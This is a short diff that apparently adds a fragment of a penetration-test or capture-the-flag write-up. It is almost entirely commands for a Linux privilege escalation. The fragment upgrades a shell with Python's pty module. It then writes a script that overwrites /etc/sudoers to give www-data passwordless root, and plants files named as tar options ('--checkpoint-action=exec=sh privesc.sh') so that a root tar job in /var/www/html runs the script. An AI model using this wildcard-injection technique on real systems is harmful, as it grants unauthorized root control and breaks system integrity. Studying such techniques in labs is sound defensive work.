@@ -1,0 +1,7 @@
+python -c 'import pty;pty.spawn("/bin/bash")';
+
+I moved to /var/www/html (which is the directory being tar'd) and ran the following.
+
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+echo "/var/www/html"  > --checkpoint=1
